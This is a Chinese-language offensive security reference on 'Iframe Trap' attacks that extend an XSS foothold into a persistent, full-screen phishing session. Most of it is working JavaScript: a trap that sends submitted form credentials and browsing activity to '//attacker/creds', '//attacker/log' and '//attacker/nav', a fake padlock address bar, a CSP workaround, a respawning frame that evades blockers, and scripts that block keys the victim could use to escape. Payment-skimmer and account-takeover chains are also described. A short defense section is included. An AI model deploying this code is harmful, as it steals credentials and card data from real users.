---
attack_surface: [客户端利用]
impact: [信息泄露, 身份伪造, 完整性破坏]
risk_level: 高
prerequisites:
  - XSS (Cross-Site Scripting) 基础
  - JavaScript 事件处理
  - History API / Navigation API
  - iframe 同源策略理解
related_techniques:
  - clickjacking
  - xss-cross-site-scripting
  - form-stealing
  - payment-skimming
  - password-manager-attacks
difficulty: 中级
tools:
  - JS-Tap (trustedsec)
  - 浏览器 DevTools
---

# Iframe Traps / Click Isolation — 持久化 XSS 钓鱼框架

> 关联文档：[Clickjacking](../Clickjacking/README.md) · [XSS](../../Reflected%20Values/XSS/README.md) · [XS-Search](../../Reflected%20Values/XS-Search/README.md) · [CSP Bypass](../CSP%20Bypass/README.md)

---

# 0x01 背景与原理

## 1.0 TL;DR

Iframe Trap 利用 XSS 将受害者"困在"一个全屏 iframe 中，劫持其后续所有页面导航、表单输入和点击行为。受害者看到的是真实网站，URL 栏被同步伪造，但所有交互都在攻击者的 JavaScript 监控之下——这是一种**会话级别的持久化钓鱼**。

## 1.1 根因：XSS 获得的是"一次性快照"，而不是"持久化会话"

传统 XSS 攻击的问题是：

```
受害者 → 点击恶意链接 → XSS 触发 → 窃取 Cookie/执行操作 → 用户离开页面 → 攻击结束
```

一旦受害者关闭标签页、刷新页面、或在地址栏输入新 URL，XSS 载荷就会丢失。攻击者只能获取到**触发时刻的快照数据**，而不是后续的浏览行为。

**Iframe Trap 的核心思路**：用 XSS 注入的全屏 iframe **重新加载整个目标网站**在 iframe 内部，然后：

1. **拦截所有导航**（hashchange、popstate、click）—— 用户在网站内点任何链接都在 iframe 内发生
2. **同步 URL 栏**（History API）—— 浏览器地址栏显示正确路径，用户不会察觉
3. **全程监控**（事件钩子）—— 窃取表单提交、键盘输入、页面浏览历史
4. **URL 栏回退保护**—— 即使用户手动输入 URL，地址栏被同步回恶意 XSS 页面

```
[浏览器地址栏: https://target.com/dashboard]   ← 被 History API 同步伪造
 ┌──────────────────────────────────────────┐
 │ [攻击者 JS — 全屏 iframe 覆盖]             │
 │  ┌────────────────────────────────────┐   │
 │  │ https://target.com (真实页面)        │   │
 │  │                                    │   │
 │  │  用户正常浏览、点击、输入…             │   │
 │  │  所有行为被攻击者 JS 静默记录          │   │
 │  └────────────────────────────────────┘   │
 │  - keylogger on iframe                   │
 │  - form submit interceptor               │
 │  - navigation tracker                    │
 │  - URL bar syncer                        │
 └──────────────────────────────────────────┘
```

## 1.2 为什么 iframe 内导航不被同源策略阻止

关键在于**攻击者已经执行了 XSS**，因此攻击代码运行在目标域上下文中。当全屏 iframe 加载 `location.href`（当前页面的 URL），攻击者代码和 iframe 内容**同源**：

- 攻击者可以访问 iframe 的 DOM（同源策略允许）
- 攻击者可以监听 iframe 内的事件（click、submit、keydown）
- 攻击者无法直接读取**跨域导航**后的 iframe 内容——但目标网站内的导航都在同源内

# 0x02 前提条件

| 条件 | 说明 |
|------|------|
| **目标页面存在 XSS** | 存储型 XSS 最优（持久化），反射型也可（但需要每次触发） |
| **目标网站使用同源导航** | 大部分内部链接在同一域名下，同源策略允许读取 iframe DOM |
| **目标不使用 `X-Frame-Options`** | 否则 iframe 无法加载目标页面（但如果 XSS 可修改响应头则绕过） |
| **JavaScript 启用** | 核心机制依赖 JS 事件监听和 History API |
| **(可选) 目标不支持 CSP frame-ancestors** | 增强持久性 |

# 0x03 经典 Iframe Trap

## 3.1 技术机制

XSS 注入全屏 iframe 加载当前页面，在 iframe 内注册全局事件监听器，劫持所有用户交互。

```javascript
// 创建全屏 iframe 加载当前页面
const i = document.createElement('iframe');
i.src = location.href;
i.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);

// 同步 URL 栏（核心——让用户不察觉）
function sync(url) {
  history.replaceState({}, '', url);
}

// 在 iframe 内注册事件钩子
i.addEventListener('load', () => {
  const w = i.contentWindow;

  // 监听 hash 变化和 History API 导航
  ['hashchange', 'popstate'].forEach(ev =>
    w.addEventListener(ev, () => sync(w.location.href))
  );

  // 拦截所有点击 → 获取导航目标 URL
  w.addEventListener('click', () =>
    fetch('//attacker/log', { method: 'POST', body: w.location.href })
  );

  // 拦截所有表单提交 → 窃取凭据
  w.document.addEventListener('submit', ev => {
    const fd = new FormData(ev.target);
    fetch('//attacker/creds', { method: 'POST', body: new URLSearchParams(fd) });
  }, true);
});
```

**工作原理**：
1. XSS 注入后，创建 `<iframe>` 并用当前页面 URL 加载
2. iframe 占据整个视口（`100vw × 100vh`，`z-index: 999999`）— 用户看不到底层
3. `load` 事件触发后，在所有 iframe 内部元素上注册监听器
4. 用户在 iframe 内点击链接 → 页面在 iframe 内导航 → `hashchange`/`popstate` 触发 → 地址栏被 `history.replaceState` 同步
5. 表单提交被 `submit` 事件截获 → 数据通过 `fetch` 外传

## 3.2 关键技巧 — 事件全注册

```javascript
var myIframe = document.getElementById('iframe_a');
// 遍历 iframe 的所有属性，找到以 'on' 开头的事件处理器
for (var key in myIframe) {
  if (key.search('on') === 0) {
    myIframe.addEventListener(key.slice(2), updateUrl);
  }
}
```
这段代码钩住 iframe 的**所有 HTML 事件**（`onload`、`onhashchange`、`onclick`……），每当任何事件触发，调用 `updateUrl()` 同步地址栏。穷举注册确保不会遗漏任何导航触发路径。

# 0x04 Modernised Trap（2024+ 现代化变体）

## 4.1 Navigation API 集成

```javascript
// Navigation API — 比 History API 更精确地捕获 SPA 导航
navigation.addEventListener('currententrychange', () => {
  sync(navigation.currentEntry.url);
});

// 主动触发导航时也同步
navigation.addEventListener('navigate', e => {
  fetch('//attacker/nav', { method: 'POST', body: e.destination.url });
});
```

Navigation API 可以捕获 SPA（Single Page Application）中的客户端路由导航——传统 `hashchange`/`popstate` 无法覆盖的场景。

## 4.2 全屏模式 + 伪造地址栏

```javascript
// 进入全屏模式隐藏浏览器 UI
document.documentElement.requestFullscreen();

// 在 iframe 顶部绘制伪造的地址栏（含假 padlock 图标）
const fakeBar = document.createElement('div');
fakeBar.innerHTML = `
  <div style="background:#1a1a1a;color:#fff;padding:6px 12px;font:13px monospace;">
    🔒 ${location.hostname}${location.pathname}
  </div>
`;
fakeBar.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:9999999;';
document.body.appendChild(fakeBar);
```

**价值**：浏览器全屏模式隐藏了真实的地址栏。攻击者绘制自己的"地址栏"，显示任意 URL——即使用户检查 URL，看到的是假的。

## 4.3 CSP 绕过 — `srcdoc` iframe

```javascript
// 如果目标页面的 CSP 阻止 inline scripts
// 使用 srcdoc 属性将 payload 放在 iframe 内部
const i = document.createElement('iframe');
i.srcdoc = `<html><body><script>${payload}</script></body></html>`;
// srcdoc 内容继承父页面的 origin，不受 CSP 限制
```

如果 CSP 使用 `'self'` 允许同源脚本，`srcdoc` iframe 同样被 CSP 视为 `'self'`，这意味着内部脚本可执行而不会被 CSP 阻止。

# 0x05 Overlay & Skimmer Usage（支付页面覆盖与数据窃取）

## 5.1 支付 Skimmer

技术机制：将 Iframe Trap 与 DOM-based 覆盖攻击结合，针对**支付页面**和**密码管理器**。

```
[合法支付页面 (iframe 内)]
  └── <input name="cardnumber">
  └── <input name="cvv">
  
[攻击者覆盖层 (在 iframe 之上)]
  └── 像素级完美覆盖的假输入框
  └── 用户输入 → 转发到真实页面（保持流程正常）
  └── 数据同时被外传
```

**为什么有效**：
- 被入侵的商户站点替换了托管的支付 iframe（Stripe、Adyen）
- 攻击者用像素级覆盖替换真实支付输入
- 使用旧版验证 API 确保支付流程不被中断——用户看到"支付成功"
- **密码管理器自动填充**的数据在填充到真实 iframe 之前就被截获

## 5.2 密码管理器数据窃取时机

Iframe Trap 的关键优势是**捕获时间窗口**：传统 XSS 只能窃取已填充的字段值，Iframe Trap 可以持续监控——用户在后续页面中输入的任何凭据都会被捕获，即使不在 XSS 注入的原始页面。

# 0x06 2025 年观察到的绕过技巧

## 6.1 `about:blank` / `data:` 本地帧

```javascript
// about:blank iframe 继承父页面的 origin
const blank = document.createElement('iframe');
blank.src = 'about:blank';
// blank.contentWindow.location.origin === parent.location.origin
// → 绕过部分内容拦截器的"第三方 iframe"启发式检测
```

`about:blank` 和 `data:` URL 的 iframe **继承父页面的 origin**，使它们在同源策略下与父页面等同。某些内容拦截器会移除"第三方 iframe"但保留这些"本地帧"。

## 6.2 嵌套 iframe 重生

即使扩展移除了顶层攻击 iframe，嵌套的子孙 iframe 可以通过 `contentWindow` 引用重建父级结构：
```javascript
// 检测子 iframe 是否被移除，动态重建
setInterval(() => {
  if (!document.body.contains(innerFrame)) {
    document.body.appendChild(recreateTrap());
  }
}, 200);
```

## 6.3 权限传播

```javascript
// 攻击者 iframe 的 allow 属性被动态修改
trapIframe.allow = 'camera;microphone;fullscreen';
// → 嵌套的孙子 iframe 也获得这些权限
// → 无明显 DOM 变化
```

通过改写父 iframe 的 `allow` 属性，所有嵌套子帧继承新权限——不产生明显的 DOM 变动，难以被 MutationObserver 监控。

# 0x07 OPSEC 技巧

## 7.1 鼠标逃逸拦截

```javascript
// 鼠标离开视口时重新聚焦 iframe → 阻止用户点击浏览器 UI
document.body.addEventListener('mouseleave', () => {
  trapIframe.focus();
});
```

## 7.2 快捷键封锁

```javascript
// 禁用右键菜单和快捷键
trapIframe.contentWindow.addEventListener('keydown', e => {
  const blocked = ['F11', 'F12']; // 全屏、DevTools
  // Ctrl+L (地址栏), Ctrl+T (新标签), Ctrl+W (关闭标签)
  if (e.ctrlKey && ['l', 't', 'w'].includes(e.key)) {
    e.preventDefault();
  }
  if (blocked.includes(e.key)) e.preventDefault();
});

// 上下文菜单抑制
trapIframe.contentWindow.addEventListener('contextmenu', e => {
  e.preventDefault();
  return false;
});
```

**限制**：用户仍可通过以下方式逃逸：
- 关闭标签页（`Ctrl+W` 不可靠拦截）
- 直接在地址栏输入新 URL（`Ctrl+L` 部分可拦截）
- 刷新页面（可通过"URL 回退感染"部分缓解）

**URL 回退感染技巧**：当检测到用户鼠标移动到浏览器顶部（可能要点刷新按钮），立即将地址栏同步回 XSS 感染 URL。这样即使刷新，重新加载的页面仍含有 XSS payload（针对存储型 XSS 场景）。

# 0x08 攻击链与联动

## 8.1 Stored XSS → Iframe Trap → 完整账户接管

```
[存储型 XSS] → 注入 iframe trap → 
  ‍ 用户在 iframe 内登录 → 凭据被截获 → 账户接管
  ‍ 用户在 iframe 内修改密码 → 新密码被截获 → 永久接管
```

## 8.2 Reflected XSS → Iframe Trap → Session 持久化

```
[反射型 XSS 链接] → 用户点击 → iframe trap 建立 →
  用户继续浏览网站 → 所有操作被监控 → Session 被劫持为"持续性"
```

## 8.3 Iframe Trap + Clickjacking → 多层劫持

```
[Iframe Trap] 困住用户 →
  [Clickjacking] 在 trap iframe 内覆盖特定按钮 →
    用户"正常操作"中触发了攻击者控制的敏感操作
```

## 8.4 Iframe Trap + Payment Skimmer → 金融数据窃取

```
[电商站点 XSS] → iframe trap 嵌入 →
  用户结算 → 支付表单被覆盖 → 卡片数据实时外传 →
  支付流程正常完成（用户不察觉）
```

## 8.5 Iframe Trap + XS-Search → 跨源信息窃取

```
[Iframe Trap] 建立持久化监控 →
  [XS-Search] 利用时间侧信道探测其他标签页的状态 →
  跨源信息聚合
```

# 0x09 检测与防御

## 9.1 服务端防御

| 策略 | 效果 | 说明 |
|------|:---:|------|
| **消除 XSS** | ✓ 根除 | Iframe Trap 的前提是 XSS——如果没有 XSS，攻击无法启动 |
| **X-Frame-Options: SAMEORIGIN** | △ | 可阻止非同源页面在 iframe 中加载目标，但 XSS 已运行在同源上下文 |
| **CSP frame-ancestors 'self'** | △ | 同上——XSS 代码与目标同源，frame-ancestors 不阻止同源嵌入 |
| **CSP script-src 'nonce-{random}'** | ✓ | 阻止未授权 inline script——即使存在 XSS 注入点，payload 无法执行 |
| **CSP 严格模式 + Trusted Types** | ✓ | Trusted Types 阻止 DOM XSS sink 接受未清洗输入 |
| **SameSite Cookies** | △ | 对 Cookie 窃取有效，但不阻止 iframe 内其他数据窃取 |

## 9.2 客户端防御

| 策略 | 说明 |
|------|------|
| `Sec-Fetch-Dest: iframe` 检测 | 服务端检查请求头，对 iframe 内请求添加额外验证（如 re-authentication） |
| 内容拦截器规则 | 检测全视口 iframe + event hooking 模式 |
| 浏览器扩展监控 | 检测异常 iframe 创建和 DOM 事件大规模注册 |

## 9.3 用户侧检测信号

- URL 栏显示正确但**无法正常刷新**（刷新后回到同一页面）
- 右键菜单被禁用
- 快捷键 `Ctrl+L` / `Ctrl+T` 无效
- `F11` 全屏模式异常（地址栏消失后出现"假地址栏"）

## 9.4 防御局限性

> **核心问题**：Iframe Trap 运行在 XSS 已成功执行的上下文中。此时攻击者已经拥有目标域的全部 JavaScript 能力。服务端防御的重点应该是**阻止 XSS 发生**，而非阻止 XSS 之后的 iframe 操作。`X-Frame-Options` 和 `frame-ancestors` 对同源 iframe 无效。**CSP nonce + Trusted Types 是最有效的防线**。

# 0x0A 实战要点

## 10.1 测试方法

1. **确认目标存在 XSS**（反射型或存储型）
2. **验证目标是否可被同源 iframe 加载**（通常可以——大多数应用不阻止同源 iframe）
3. **构建 iframe trap payload**：
   ```javascript
   // 最小化 PoC — 仅验证同源 iframe 导航劫持
   const i = document.createElement('iframe');
   i.src = '/dashboard';
   i.style = 'position:fixed;inset:0;width:100vw;height:100vh';
   document.body.appendChild(i);
   i.onload = () => {
     i.contentWindow.addEventListener('click', () => {
       console.log('Nav captured:', i.contentWindow.location.href);
     });
   };
   ```
4. **验证 URL 同步**：在 iframe 内点击链接，检查 iframe 内 URL 是否变化，外部地址栏是否可被 `history.replaceState` 更新

## 10.2 JS-Tap 工具

由 TrustedSec 发布的专用武器化工具，内置了 iframe trap 功能：

```
https://github.com/trustedsec/js-tap
```

功能：iframe trap 建立、自动事件钩子注册、URL 同步、表单数据收集、本地存储窃取、截图捕获。

## 10.3 限制与注意事项

- **跨域导航失效**：如果用户在 iframe 内导航到外部域名（如点击了 `target="_blank"` 链接或第三方登录），同源策略阻止攻击者读取新页面的 DOM
- **标签页关闭**：`Ctrl+W` / `Cmd+W` 无法可靠阻止——用户关闭标签即逃逸
- **地址栏直接输入**：`Ctrl+L` 在部分浏览器中可拦截，但非 100% 可靠
- **存储型 XSS vs 反射型 XSS**：存储型 XSS 最理想（刷新后仍存在），反射型需要用户每次都点击恶意链接

## 参考资料

### 原始研究
- [TrustedSec: Persisting XSS with Iframe Traps](https://trustedsec.com/blog/persisting-xss-with-iframe-traps)
- [TrustedSec: JS-Tap — Weaponizing JavaScript for Red Teams](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams)
- [The Hacker News: Iframe Security Exposed — Blind Spot Fueling Payment Skimmer Attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [arXiv: Local Frames — Exploiting Inherited Origins to Bypass Blockers (2025)](https://arxiv.org/abs/2506.00317)

### 工具
- [JS-Tap (GitHub)](https://github.com/trustedsec/js-tap)
